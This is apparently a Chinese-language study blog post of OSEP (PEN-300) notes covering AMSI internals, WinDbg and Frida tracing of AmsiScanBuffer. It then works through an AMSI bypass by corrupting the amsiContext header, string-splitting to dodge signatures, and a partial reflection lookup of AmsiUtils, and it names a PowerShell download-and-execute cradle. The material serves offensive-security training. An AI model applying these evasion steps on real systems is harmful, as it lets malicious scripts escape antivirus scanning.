---
title: "[OSEP, PEN-300] Instructional notes - Part 4"
date: 2026-09-28
author: "CHW"
tags:
  - offsec
description: "OSEP PEN-300 筆記 Part 4，整理 Advanced Antivirus Evasion、AMSI 掃描機制、Intel x86/x64 組合語言與 WinDbg 操作、Frida hooking、以 Reflection 與 binary patching 繞過 PowerShell AMSI、amsiInitFailed 與 VirtualProtect patch、FodHelper UAC Bypass、JScript 透過 Registry 與 DLL hijacking 繞過 AMSI 等等。"
---


[OSEP, PEN-300] Instructional notes - Part 4
===


# Table of Contents
[TOC]

# [Link back to: "[OSEP, PEN-300] Instructional notes - Part 1"](https://chw41.github.io/b1og/osep-pen-300-instructional-notes---part-1/)
# [Link back to: "[OSEP, PEN-300] Instructional notes - Part 2"](https://chw41.github.io/b1og/osep-pen-300-instructional-notes---part-2/)
# [Link back to: "[OSEP, PEN-300] Instructional notes - Part 3"](https://chw41.github.io/b1og/osep-pen-300-instructional-notes---part-3/)

>[!Caution]
> 接續 [[OSEP, PEN-300] Instructional notes - Part 3](https://chw41.github.io/b1og/osep-pen-300-instructional-notes---part-3/) 內容

# Advanced Antivirus Evasion
前一章透過逐步找
- 找 static signature
- 修改/obfuscate 特徵
- 避免 emulator
- PowerShell payload 直接在 memory 中執行

Windows 10 之後加入了 AMSI（[Antimalware Scan Interface](https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal)），PowerShell 即使沒有把 script 寫成 .ps1 落地，執行內容仍然可以透過 AMSI 交給 antivirus 掃描

>[!Note]
> AMSI 是什麼？
> 可以先理解成應用程式與防毒軟體之間的一個內容掃描介面
> ```
> PowerShell
>    │
>    │ 我要執行這段 script
>    ▼
>   AMSI
>    │
>    │ 把 script/content 交出去
>    ▼
>Antivirus Engine
>    │
>    ├── Clean
>    │
>    └── Malicious
> ```
> 即使利用 `IEX (New-Object Net.WebClient).DownloadString(...)` 沒有落地，也有可能被掃到

## Intel Architecture and Windows 10
概述 Intel 架構並討論 Windows 10 的 32-bit(x86) 和 64-bit(x86_64) 版本中的一些基本 assembly operations

64 位元架構是 32 位元架構的擴展，因此兩者有許多相似之處。在 assembly level，兩者都大量使用 data areas (ex. [stack](https://en.wikipedia.org/wiki/Stack-based_memory_allocation) or [heap](https://en.wikipedia.org/wiki/C_dynamic_memory_allocation#Heap-based))， 且都使用 CPU registers

### - Stack
Stack 通常通常儲存大小固定、limited scope的（高階語言）變數的內容，而 Heap 用於動態記憶體分配和長時間運行的持久記憶體\
Stack 通常用在 function local state, return address, 保存 register, 某些 function arguments, temporary data
```
High Address
┌─────────────────┐
│ previous frame  │
├─────────────────┤
│ return address  │
├─────────────────┤
│ saved register  │
├─────────────────┤
│ local data      │ ← RSP 附近
└─────────────────┘
Low Address
```
LIFO (Last In First Out)
- `push rax`: 把 RAX 的內容壓到 stack
- `pop rax`: 把 stack 最上面的內容取回 RAX

### - Heap
Heap 主要對應 dynamic allocation，例如 C 的 `malloc(...)`, Windows `HeapAlloc(...)``VirtualAlloc(...)`\
動態、大小可調整、生命週期可以跨 function

### - CPU Register
CPU 真正操作的主要 Registers + Memory\
高階語言會看到 `int result = ScanBuffer(...);`，底層會是 
```
call ScanBuffer
mov ebx,eax
```
> EAX 就是 register

### - 32-bit 與 64-bit Register
x86 可能看到：
```
EAX
EBX
ECX
EDX
ESI
EDI
EBP
ESP
EIP
```
x64 擴充成：
```
RAX
RBX
RCX
RDX
RSI
RDI
RBP
RSP
RIP
```
- RAX = 64 bit
- EAX = RAX 的低 32 bit
- AX  = 更低的 16 bit
- AL  = 更低的 8 bit
```
RAX
┌────────────────────────────────────────────────────────────────┐
│                         64 bits                                │
└────────────────────────────────────────────────────────────────┘
                                ┌────────────────────────────────┐
                                │ EAX          32 bits           │
                                └────────────────────────────────┘
                                                ┌────────────────┐
                                                │ AX   16 bits   │
                                                └────────────────┘
                                                        ┌────────┐
                                                        │ AL 8bit│
                                                        └────────┘
```
In a 32-bit\
![image](https://hackmd.io/_uploads/SkpWcjOUGl.png)

In 64-bit\
![image](https://hackmd.io/_uploads/r1OG9ou8Gx.png)

>[!Important]
>RIP = Instruction Pointer
>- x86   → EIP
>- x64   → RIP

### WinDbg Introduction
WinDbg 是 Windows 的 debugger，可以直接在 assembly level 觀察與修改程式的執行狀態\
File → Attach to Process → notepad.exe\
![image](https://hackmd.io/_uploads/ryO7ZAOUfe.png)\
![image](https://hackmd.io/_uploads/H10SZCuIMx.png)

Attach 成功之後，WinDbg 會主動把 execution flow suspend\
內部基本排版分成兩個區塊：Disassembly Window 和 Command Window
![image](https://hackmd.io/_uploads/r1MTDDt8Gg.png)
- Disassembly
CPU 正在執行或即將執行的 machine instructions
```Dbg
00007fff`cff400bf 57 push rdi
00007fff`cff400c0 4883ec60 sub rsp,60h
等等
```
- Command
可輸入 WinDbg 指令
```dbg
0:005> bp kernel32!writefile

0:005> g
```
> - `bp`： 代表 breakpoint
> - `kernel32!WriteFile`：kernel32.dll 裡面的 WriteFile function
>> 當程式執行到 kernel32!WriteFile 時，把程式停下來
>
> - `g`：繼續執行

為了觸發斷點，在記事本中輸入一些文字並儲存檔案
```dbg
Breakpoint 0 hit
KERNEL32!WriteFile:
00007fff`d33b21a0 ff259a690500    jmp     qword ptr [KERNEL32!_imp_WriteFile (00007fff`d3408b40)] ds:00007fff`d3408b40={KERNELBASE!WriteFile (00007fff`cff400b0)}
```
> 某一個 thread 執行到了 kernel32!WriteFile，所以 debugger 把 process freeze\
> `jmp ...` 不是 breakpoint 下錯，kernel32 export 的 function 不一定自己包含完整 implementation，真正的 implementation 在 KernelBase.dll
> ```
> kernel32!WriteFile
>       ↓
>      jmp
>       ↓
>KERNELBASE!WriteFile
> ```

- p：執行目前 instruction，然後停在下一條

>[!Tip]
>- `mov rax,rbx` 代表：RAX = RBX
>- `mov rax,[rbx]` 代表：RAX = memory at address RBX

```dbg
0:000> p
KERNELBASE!WriteFile:
00007fff`cff400b0 48895c2410      mov     qword ptr [rsp+10h],rbx ss:00000063`4c93e8d8=0000000000000400

0:000> p
KERNELBASE!WriteFile+0x5:
00007fff`cff400b5 4889742418      mov     qword ptr [rsp+18h],rsi ss:00000063`4c93e8e0=000002303546a9b0

0:000> p
KERNELBASE!WriteFile+0xa:
00007fff`cff400ba 4c894c2420      mov     qword ptr [rsp+20h],r9 ss:00000063`4c93e8e8=00000000000004e4

0:000> p
KERNELBASE!WriteFile+0xf:
00007fff`cff400bf 57              push    rdi
```
> - `mov qword ptr [rsp+10h],rbx`: mov destination, source\
> 將 RBX 的內容寫入 RSP + 0x10 指向的 memory
> - `mov qword ptr [rsp+18h],rsi`: [RSP + 0x18] = RSI\
> 把 RSI 保存到 stack 附近的位置
> - `mov qword ptr [rsp+20h],r9`: [RSP + 0x20] = R9\
> WriteFile 進來後，把第四個 function argument (R9 = 第四個 argument) 暫存到 stack
> - `push rdi`: x64 上理解成 RSP = RSP - 8 , [RSP] = RDI\
> 把 RDI 保存到 stack

unassemble 反組譯（u）特定位址，通常是 RIP 位址
```dbg
0:000> u rip L5
KERNELBASE!WriteFile+0xf:
00007fff`cff400bf 57              push    rdi
00007fff`cff400c0 4883ec60        sub     rsp,60h
00007fff`cff400c4 498bd9          mov     rbx,r9
00007fff`cff400c7 4c8bda          mov     r11,rdx
00007fff`cff400ca 488bf9          mov     rdi,rcx
```
> 從目前 CPU Instruction Pointer 開始顯示 5 個 instructions

- r：查看 Registers
顯示所有主要 registers
```windbg
0:000> r
rax=0000000000000004 rbx=000002303a156590 rcx=0000000000000438
rdx=000002303a156590 rsi=0000000000000004 rdi=0000000000000004
rip=00007fffcff400bf rsp=000000634c93e8c8 rbp=00000000000004e4
 r8=0000000000000004  r9=000000634c93e940 r10=0000000000000000
r11=0000023035413cd0 r12=0000000000000400 r13=0000000000000438
r14=000000634c93e960 r15=000002303546a9b0
iopl=0         nv up ei pl zr na po nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
KERNELBASE!WriteFile+0xf:
00007fff`cff400bf 57              push    rdi
```
若全部 register 太多，可以單獨顯示
```dbg
0:000> r rax
rax=0000000000000004
```
- dd：Dump DWORD
從 RSP 指向的 address 開始，用 32-bit 一組的格式顯示 memory
```windbg
0:000> dd rsp
00000063`4c93e8c8  9a465c0e 00007ff6 0000003f 00000063
00000063`4c93e8d8  3a156590 00000230 00000004 00000000
00000063`4c93e8e8  4c93e940 00000063 00000000 00000000
00000063`4c93e8f8  00000004 00007fff 00000000 00000000
00000063`4c93e908  4c93e960 00000063 000004e4 00000000
00000063`4c93e918  00000400 00000000 00000001 00000000
00000063`4c93e928  38c20008 00000230 3a15f8f0 00000230
00000063`4c93e938  9a465fd1 00007ff6 00000041 00000000
```
可用 ed 指令修改 DWORD 值
```dbg
0:000> dd rsp L1
00000063`4c93e8c8  9a465c0e

0:000> ed rsp 0

0:000> dd rsp L1
00000063`4c93e8c8  0
```

- dc：DWORD + ASCII
```windbg
0:000> dc rsp
00000063`4c93e8c8  9a465c0e 00007ff6 0000003f 00000063  .\F.....?...c...
00000063`4c93e8d8  3a156590 00000230 00000004 00000000  .e.:0...........
00000063`4c93e8e8  4c93e940 00000063 00000000 00000000  @..Lc...........
00000063`4c93e8f8  00000004 00007fff 00000000 00000000  ................
00000063`4c93e908  4c93e960 00000063 000004e4 00000000  `..Lc...........
00000063`4c93e918  00000400 00000000 00000001 00000000  ................
00000063`4c93e928  38c20008 00000230 3a15f8f0 00000230  ...80......:0...
00000063`4c93e938  9a465fd1 00007ff6 00000041 00000000  ._F.....A.......
```
(若 memory 包含 string, buffer, script, text 等等會很好用)

- dq：Dump QWORD
64-bit address 一次完整顯示
```windbg
0:000> dq rsp
00000063`4c93e8c8  00007ff6`9a465c0e 00000063`0000003f
00000063`4c93e8d8  00000230`3a156590 00000000`00000004
00000063`4c93e8e8  00000063`4c93e940 00000000`00000000
00000063`4c93e8f8  00007fff`00000004 00000000`00000000
00000063`4c93e908  00000063`4c93e960 00000000`000004e4
00000063`4c93e918  00000000`00000400 00000000`00000001
00000063`4c93e928  00000230`38c20008 00000230`3a15f8f0
00000063`4c93e938  00007ff6`9a465fd1 00000000`00000041
```
指令 | 意義 |
:------:|:---------|
dd | Dump DWORD，32-bit |
dc | DWORD + ASCII |
dq | Dump QWORD，64-bit | 

```
Open application
      ↓
Attach WinDbg
      ↓
bp function
      ↓
g
      ↓
Breakpoint hit
      ↓
r
      ↓
看 registers
      ↓
u rip
      ↓
看 assembly
      ↓
dd / dc / dq
      ↓
看 memory
      ↓
p
      ↓
逐條執行
      ↓
必要時修改 memory
```

## Antimalware Scan Interface
Microsoft 加入 AMSI，讓應用程式可以在 runtime 把即將執行的內容交給防毒\
找出 PowerShell 執行內容時，是哪一段資料被送進 [AMSI](https://twitter.com/Lee_Holmes/status/1189215159765667842/photo/1)，以及掃描結果怎麼回到 PowerShell

### Understanding AMSI
AMSI.DLL 是載入 PowerShell process 裡面的 powershell.exe、powershell_ise.exe 等，ASMI 比較像 Broker / Interface，幫應用程式把 runtime content 交給 antimalware provider (真正做 signature detection, heuristics 還是 antivirus engine)

ASMI 架構：\
![image](https://hackmd.io/_uploads/HJEG91o8fx.png)
```
PowerShell Process
┌───────────────────────────────┐
│                               │
│ PowerShell Engine             │
│        │                      │
│        ▼                      │
│    AMSI.DLL                   │
│        │                      │
└────────┼──────────────────────┘
         │
         │ scan request
         ▼
 Windows Defender
         │
         │ scan result
         ▼
     AMSI.DLL
         │
         ▼
    PowerShell
```
ASMI 利用 [Remote Procedure Call](https://docs.microsoft.com/en-us/windows/win32/rpc/rpc-start-page)(RPC) 轉送給 AV\
總之📒： PowerShell process 和 Antivirus 之間透過 AMSI 當作中間的媒介

>[!Important]
>AMSI 重要的 API: `AmsiInitialize`, `AmsiOpenSession`,`AmsiScanString`, `AmsiScanBuffer`, `AmsiCloseSession`
>
> 整體流程：
> ```
> PowerShell start
>      │
>      ▼
>AmsiInitialize
>      │
>      ▼
>建立 AMSI Context
>      │
>      ▼
>PowerShell command/script
>      │
>      ▼
>AmsiOpenSession
>      │
>      ▼
>建立 AMSI Session
>      │
>      ▼
>AmsiScanBuffer
>      │
>      ▼
>Defender scans content
>      │
>      ▼
>AMSI_RESULT
>      │
>      ▼
>AmsiCloseSession
> ```

- [AmsiInitialize](https://docs.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-amsiinitialize)
AmsiInitialize 執行成功後，會把初始化好的 context 寫到這裡 (AMSI Context)
```c
HRESULT AmsiInitialize(
  LPCWSTR      appName,
  HAMSICONTEXT *amsiContext
);
```
- [AmsiOpenSession](https://docs.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-amsiopensession)
建立一個 AMSI Session
```c
HRESULT AmsiOpenSession(
  HAMSICONTEXT amsiContext,
  HAMSISESSION *amsiSession
);
```
- [AmsiScanString](https://docs.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-amsiscanstring)
用來 scan string 文字形式的內容
> AmsiScanBuffer supersede AmsiScanString

- [AmsiScanBuffer](https://docs.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-amsiscanbuffer)
```c
HRESULT AmsiScanBuffer(
  HAMSICONTEXT amsiContext,
  PVOID        buffer,
  ULONG        length,
  LPCWSTR      contentName,
  HAMSISESSION amsiSession,
  AMSI_RESULT  *result
);
```
breakpoint AmsiScanBuffer，然後看 buffer 裡到底有什麼
```
AmsiScanBuffer
│
├── amsiContext
│      └── AMSI environment
│
├── buffer
│      └── pointer → 要掃描的內容
│
├── length
│      └── buffer 長度
│
├── contentName
│      └── content identifier
│
├── amsiSession
│      └── session
│
└── result
       └── pointer → Defender scan result
```
- [AmsiCloseSession](https://docs.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-amsiclosesession)
關閉本次 AMSI session


建立 → 開 session → 掃描:
```
AmsiInitialize = 建立 AMSI context
AmsiOpenSession = 建立 scan session
AmsiScanBuffer = 送出真正 content
AmsiCloseSession = 結束 session
```
```
powershell.exe starts
        │
        ▼
Load AMSI.DLL
        │
        ▼
AmsiInitialize
        │
        ├── appName
        └── amsiContext
                │
                ▼
        AMSI initialized
                │
                ▼
      User executes command
                │
                ▼
        AmsiOpenSession
                │
                ├── amsiContext
                └── amsiSession
                        │
                        ▼
               AmsiScanBuffer
                        │
            ┌───────────┼───────────┐
            │           │           │
         buffer       length      result
            │
            ▼
      PowerShell content
            │
            ▼
      Windows Defender
            │
            ▼
       scan / classify
            │
            ▼
        AMSI_RESULT
            │
            ▼
       PowerShell reacts
            │
            ▼
       AmsiCloseSession
```

### Hooking with Frida
>[!Note]
> WinDbg 可以做到
> ```
> bp amsi!AmsiScanBuffer
> g
> ```
> breakpoint hit 後手動分析，🥚 如果 AmsiScanBuffer 被呼叫很多次，就要一直
> ```
> hit
> ↓
> inspect
> ↓
> continue
> ↓
> hit
> ↓
> inspect
> ```
> 

Frida 的優勢是直接 hook function，在每次進入與離開時自動執行 JavaScript
```
PowerShell
   ↓
AmsiScanBuffer()
   ↓
Frida hook
   ├── 自動印 arguments
   ├── 自動讀 buffer
   └── 自動印 result
```
Frida 可以透過 Python 後端連接 Win32 API，同時使用 JavaScript 顯示和解釋參數和傳回值\
使用 frida-trace 呼叫 Frida 進行追蹤:
- `-p`: 提供 PowerShell process ID
- `-x`: 提供要追蹤的 DLL 
- `-i`: 追蹤的特定 API 的名稱。
- `(*)`: 追蹤所有以「Amsi」開頭的函數：
```powershell
C:\Users\Offsec> frida-trace -p 1584 -x amsi.dll -i Amsi*
Instrumenting functions...
AmsiOpenSession: Auto-generated handler at "C:\\Users\\Offsec\\__handlers__\\amsi.dll\\AmsiOpenSession.js"
AmsiUninitialize: Auto-generated handler at "C:\\Users\\Offsec\\__handlers__\\amsi.dll\\AmsiUninitialize.js"
AmsiScanBuffer: Auto-generated handler at "C:\\Users\\Offsec\\__handlers__\\amsi.dll\\AmsiScanBuffer.js"
AmsiUacInitialize: Auto-generated handler at "C:\\Users\\Offsec\\__handlers__\\amsi.dll\\AmsiUacInitialize.js"
AmsiInitialize: Auto-generated handler at "C:\\Users\\Offsec\\__handlers__\\amsi.dll\\AmsiInitialize.js"
AmsiCloseSession: Auto-generated handler at "C:\\Users\\Offsec\\__handlers__\\amsi.dll\\AmsiCloseSession.js"
AmsiScanString: Auto-generated handler at "C:\\Users\\Offsec\\__handlers__\\amsi.dll\\AmsiScanString.js"
AmsiUacUninitialize: Auto-generated handler at "C:\\Users\\Offsec\\__handlers__\\amsi.dll\\AmsiUacUninitialize.js"
AmsiUacScan: Auto-generated handler at "C:\\Users\\Offsec\\__handlers__\\amsi.dll\\AmsiUacScan.js"
Started tracing 9 functions. Press Ctrl+C to stop.
```
在 PowerShell 中輸入 "test"，Frida 找到以下
```windbg
           /* TID 0x17f0 */
174222 ms  AmsiOpenSession()
174223 ms  AmsiScanBuffer()
174355 ms  AmsiScanBuffer()
174366 ms  AmsiScanBuffer()
174375 ms  AmsiScanBuffer()
174382 ms  AmsiScanBuffer()
174385 ms  AmsiScanBuffer()
           /* TID 0x1934 */
174406 ms  AmsiCloseSession()
           /* TID 0x17f0 */
174406 ms  AmsiOpenSession()
174406 ms  AmsiScanBuffer()
           /* TID 0x1934 */
174411 ms  AmsiCloseSession()
```
找到了 AmsiOpenSession、AmsiScanBuffer 和 AmsiCloseSession
等 calls，🥚不能確定我們的輸入是否與所有這些 calls 有關\
Frida 自動建立 Handler (在啟動 Frida 追蹤 session，會為 hooked API 建立處理程序檔案)，除了印出 function name，還會幫每個 API 建 JavaScript handler
```
C:\Users\Offsec\__handlers__\amsi.dll\AmsiScanBuffer.js
```
查看 AmsiScanBuffer.js
```javascript
...
  /**
   * Called synchronously when about to call AmsiScanBuffer.
   *
   * @this {object} - Object allowing you to store state for use in onLeave.
   * @param {function} log - Call this function with a string to be presented to the user.
   * @param {array} args - Function arguments represented as an array of NativePointer objects.
   * For example use args[0].readUtf8String() if the first argument is a pointer to a C string encoded as UTF-8.
   * It is also possible to modify arguments by assigning a NativePointer object to an element of this array.
   * @param {object} state - Object allowing you to keep state across function calls.
   * Only one JavaScript function will execute at a time, so do not worry about race-conditions.
   * However, do not use this to store function arguments across onEnter/onLeave, but instead
   * use "this" which is an object for keeping state local to an invocation.
   */
  onEnter: function (log, args, state) {
    log('AmsiScanBuffer()');
  },

  /**
   * Called synchronously when about to return from AmsiScanBuffer.
   *
   * See onEnter for details.
   *
   * @this {object} - Object allowing you to access state stored in onEnter.
   * @param {function} log - Call this function with a string to be presented to the user.
   * @param {NativePointer} retval - Return value represented as a NativePointer object.
   * @param {object} state - Object allowing you to keep state across function calls.
   */
  onLeave: function (log, retval, state) {
  }
...
```
> Handler 的 onEnter: onEnter 是在 function 被呼叫、真正執行 body 之前觸發
> ```
> Caller
>  ↓
>AmsiScanBuffer(...)
>  ↑
>onEnter 在這裡
>  ↓
>function body
> ```
> 修改這個檔案，能夠控制每次 AmsiScanBuffer 被呼叫時要做什麼

修改 onEnter:
```javascript
onEnter: function (log, args, state) {
  log('[*] AmsiScanBuffer()');
  log('|- amsiContext: ' + args[0]);
  log('|- buffer: ' + Memory.readUtf16String(args[1]));
  log('|- length: ' + args[2]);
  log('|- contentName ' + args[3]);
  log('|- amsiSession ' + args[4]);
  log('|- result ' + args[5] + "\n");
  this.resultPointer = args[5];
},
```
> - `args[0]`: 印出 amsiContext，Ex. 0x1f862fa6f40 通常是一個 native handle / pointer
> - `args[1]`：最重要的 Buffer，從 args[1] 指向的 memory 開始，把內容當成 UTF-16 Unicode string 讀出 (若只使用 `log(args[1])` 只會看到 `0x12345678` 不知道內容)
> - `args[2]`：Length， Ex. test = 8 bytes
> - `args[5]`：Result Pointer 傳 memory address，讓 AMSI 將結果寫進去
> - [`this`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/this): 包存當次 function invocation 專屬的 state
>```
>onEnter
>   ↓
>拿到 result pointer
>   ↓
>AmsiScanBuffer 執行
>   ↓
>Defender analysis
>   ↓
>結果寫入 *result
>   ↓
>onLeave
>```

onLeave: 
```javascript
onLeave: function (log, retval, state) {
  log('[*] AmsiScanBuffer() Exit');
  resultPointer = this.resultPointer;
  log('|- Result value is: ' + Memory.readUShort(resultPointer) + "\n");
}
```
> onLeave 發生的位置
> ```
> AmsiScanBuffer body
>       ↓
>scan complete
>       ↓
>result written
>       ↓
>onLeave ← 在這裡
>       ↓
>return to caller
> ```
> 最適合讀 *result
>
> - `Memory.readUShort`: 從 result pointer 指向的位置讀一個 unsigned short
> ```
> result pointer
>      │
>      ▼
>memory
>┌───────────────┐
>│ AMSI_RESULT   │
>└───────────────┘
>      │
>      ▼
>readUShort()
> ```

利用 PowerShell 測試 `test`
```windbg
...
2730732 ms  AmsiOpenSession()
2730732 ms  [*] AmsiScanBuffer()
2730732 ms  |- amsiContext: 0x1f862fa6f40
2730732 ms  |- buffer: test
2730732 ms  |- length: 0x8
2730732 ms  |- contentName 0x1f84ad8142c
2730732 ms  |- amsiSession 0xd
2730732 ms  |- result 0x599f9ce948

2730744 ms  [*] AmsiScanBuffer() Exit
2730744 ms  |- Result value is: 1
...
```

監控 AmsiScanBuffer API 的輸入輸出
```powershell
PS C:\Users\Offsec> 'AmsiUtils'
At line:1 char:1
+ 'AmsiUtils'
+ ~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
```
> Defender 偵測為 malicious

Frida 輸出：
```windbg
...
4290781 ms  [*] AmsiScanBuffer()
4290781 ms  |- amsiContext: 0x1f862fa6f40
4290781 ms  |- buffer: 'AmsiUtils'
4290781 ms  |- length: 0x16
4290781 ms  |- contentName 0x1f84ad8142c
4290781 ms  |- amsiSession 0x33
4290781 ms  |- result 0x599f9ce948

4290807 ms  [*] AmsiScanBuffer() Exit
4290807 ms  |- Result value is: 32768
...
```

善用字串拆解：
```powershell
PS C:\Users\Offsec> 'Am'+'siUtils'
AmsiUtils
```
> 成功\
> 可以得知 "AmsiUtils" 字串被 Defender 標記為惡意字串
```windbg
4461772 ms  [*] AmsiScanBuffer()
4461772 ms  |- amsiContext: 0x1f862fa6f40
4461772 ms  |- buffer: 'Am'+'siUtils'
4461772 ms  |- length: 0x1c
4461772 ms  |- contentName 0x1f84ad8142c
4461772 ms  |- amsiSession 0x36
4461772 ms  |- result 0x599f9ce948

4461781 ms  [*] AmsiScanBuffer() Exit
4461781 ms  |- Result value is: 1
```

## Bypassing AMSI With Reflection in PowerShell
上述皆只觀察 AMSI，開始利用 AMSI context 結構的驗證邏輯，讓 AmsiOpenSession() 主動失敗
```
PowerShell command
      ↓
AmsiOpenSession
      ↓
AmsiScanBuffer
      ↓
Defender
      ↓
AMSI_RESULT
```
最直覺的 bypass 方法之一即是一直修改 PowerShell source\
👉🏻 避開 Defender signature (如 `'Am'+'siUtils'`)
典型的 cat🐱 and mouse🐭 ，當 Defender 新增 signature 就需要再改 payload

🧠：不去躲每次 AmsiScanBuffer，而是讓 AMSI 本身進入錯誤狀態\
(直接破壞 scanner 初始化後依賴的 state)

### What Context Mom?
AMSI Context:
```cpp
HRESULT AmsiInitialize(
    LPCWSTR appName,
    HAMSICONTEXT *amsiContext
);
```
> `AmsiInitialize()` 建立 amsiContext 後面的 API 都依賴它 (`AmsiOpenSession`, `AmsiScanBuffer`等等)
> ```
> AmsiInitialize
>      ↓
> amsiContext
>      │
>      ├── AmsiOpenSession
>      ├── AmsiScanBuffer
>      └── other AMSI operations
> ```


先用 Frida 找 amsiContext:
```windbg
27583730 ms  [*] AmsiScanBuffer()
27583730 ms  |- amsiContext: 0x1f862fa6f40
27583730 ms  |- buffer: test
27583730 ms  |- length: 0x8
27583730 ms  |- contentName 0x1f84ad8142c
27583730 ms  |- amsiSession 0x38
27583730 ms  |- result 0x599f9ce948

27583742 ms  [*] AmsiScanBuffer() Exit
27583742 ms  |- Result value is: 1
```
> amsiContext address = 0x1f862fa6f40\
> amsiContext 是初始化時建立的，所以每次 scan 的 address 都會一樣 (適合丟給 WinDbg)

WinDbg -> attach PowerShell process -> dump memory contents
```windbg
0:014> dc 0x1f862fa6f40 
000001f8`62fa6f40  49534d41 00000000 48efe1f0 000001f8  AMSI.......H....
000001f8`62fa6f50  4905dd30 000001f8 00000039 00000000  0..I....9.......
000001f8`62fa6f60  d722b5cb ad27f1b7 2a525af5 8c00025b  .."...'..ZR*[...
000001f8`62fa6f70  0065004e 00730074 00610063 00650070  N.e.t.s.c.a.p.e.
000001f8`62fa6f80  00420020 00730061 00200065 00520055   .B.a.s.e. .U.R.
000001f8`62fa6f90  0000004c 00000000 2a555afa 92000312  L........ZU*....
000001f8`62fa6fa0  00740053 00650072 00740065 00410020  S.t.r.e.e.t. .A.
000001f8`62fa6fb0  00640064 00650072 00730073 00000000  d.d.r.e.s.s.....
```
> Memory 中 DWORD: `49534D41`\
> ASCII: `ASMI`\
> 看起來像 magic/header/signature

若能夠觀察到 AMSI API 中實際的上下文結構，或許就能確定前四個位元組是否被引用。使用 WinDbg 中的反組譯指令以及 AMSI 模組中的 AmsiOpenSession 函數
```windbg
0:014> u amsi!AmsiOpenSession
amsi!AmsiOpenSession:
00007fff`c75c24c0 e943dcdb0b      jmp     00007fff`d3380108
00007fff`c75c24c5 4885c9          test    rcx,rcx
00007fff`c75c24c8 7441            je      amsi!AmsiOpenSession+0x4b (00007fff`c75c250b)
00007fff`c75c24ca 8139414d5349    cmp     dword ptr [rcx],49534D41h
00007fff`c75c24d0 7539            jne     amsi!AmsiOpenSession+0x4b (00007fff`c75c250b)
00007fff`c75c24d2 4883790800      cmp     qword ptr [rcx+8],0
00007fff`c75c24d7 7432            je      amsi!AmsiOpenSession+0x4b (00007fff`c75c250b)
00007fff`c75c24d9 4883791000      cmp     qword ptr [rcx+10h],0
```
> - Windows x64 calling convention：`arg1 → RCX`\
> 而 AmsiOpenSession：RCX = amsiContext，所以 RCX = amsiContext
> - `cmp dword ptr [rcx],49534D41h`: 拆開 RCX = amsiContext address\
> [RCX] = dereference amsiContext 指向的 memory，比較 amsiContext 的前四 bytes 是否等於 0x49534D41
> - `jne amsi!AmsiOpenSession+0x4b`:\
> ![image](https://hackmd.io/_uploads/HkhljWXdze.png)
> ```
> Context header == "AMSI"
>      │
>      ├── Yes → 繼續正常流程
>      │
>      └── No  → error path
> ```

如果 header bytes 與 static DWORD 不相等，會觸發條件跳轉並將執行跳到函數內部 offset 0x4B

使用 WinDbg 顯示該 address 的 instructions\
Error Path:
```windbg
0:014> u amsi!AmsiOpenSession+0x4b L2
amsi!AmsiOpenSession+0x4b:
00007fff`c75c250b b857000780      mov     eax,80070057h
00007fff`c75c2510 c3              ret
```
> - `mov eax,80070057h`: \
> EAX / RAX 通常承載 native function return value，所以 function 準備回傳 0x80070057 
> - `ret`: 直接返回 caller

分析 `0x80070057` 是什麼？\
AmsiOpenSession prototype `HRESULT AmsiOpenSession(...)`，所以 0x80070057 應該當成 HRESULT 解析
```cpp
HRESULT AmsiOpenSession(
  HAMSICONTEXT amsiContext,
  HAMSISESSION *amsiSession
);
```
因此 function 邏輯可以大致還原：
```cpp
HRESULT AmsiOpenSession(ctx, session)
{
    if (ctx == NULL)
        return E_INVALIDARG;

    if (*(DWORD *)ctx != 'AMSI')
        return E_INVALIDARG;

    ...
}
```

用 WinDbg 人工破壞 Header:\
在 AmsiOpenSession 函數上設定斷點，並透過輸入 PowerShell 命令來觸發。斷點觸發後使用 ed 函數修改上下文結構的前四個 bytes，然後讓程式繼續執行
```windbg
0:014> bp amsi!AmsiOpenSession

0:014> g
Breakpoint 0 hit
amsi!AmsiOpenSession:
00007fff`c75c24c0 e943dcdb0b      jmp     00007fff`d3380108

0:006> dc rcx L1
000001f8`62fa6f40  49534d41                             AMSI

0:006> ed rcx 0

0:006> dc rcx L1
000001f8`62fa6f40  00000000                             ....

0:006> g

```
![image](https://hackmd.io/_uploads/r1ByiDIOfg.png)

Frida 確認：
```
30024801 ms  [*] AmsiOpenSession()
30024801 ms  |- amsiContext: 0x1f862fa6f40
30024801 ms  |- amsiSession: 0x7fff37328268

30024803 ms  [*] AmsiOpenSession() Exit
30024803 ms  |- HRESULT value is: 0x80070057
```
> HRESULT = 0x80070057\
> 👉🏻 Frida 不再看到後續 AMSI API\
> ![image](https://hackmd.io/_uploads/B1B5iPIOMg.png)

AMSI scanning path 被切斷了，但 PowerShell 本身沒有 crash
```
corrupted header
      ↓
cmp fails
      ↓
JNE
      ↓
mov eax,80070057
      ↓
ret
```

測試 `amsiutils` 是否被 Block
```
PS C:\Users\Offsec> 'amsiutils'
amsiutils
```
> signature 沒有消失，只是 AMSI scan path 沒有再被呼叫

>[!Tip]
>以上分析需要使用者自己開 WinDbg 人工 debugger 操作
>> 能不能直接從 PowerShell 找到同一個 amsiContext pointer ?!

🧠：利用 PowerShell 寫一個完整的腳本，自動抓 amsiContext pointer

送進 AMSI 時就直接被 block
```powershell
PS C:\Users\Offsec> [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
At line:1 char:1
+ [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
```
> 直接寫完整 Type Name 會被 block


取得 assembly 裡全部 types，找 name 結尾符合 `*iUtils` 的 Type
```powershell
PS C:\Users\Offsec> $a=[Ref].Assembly.GetTypes()

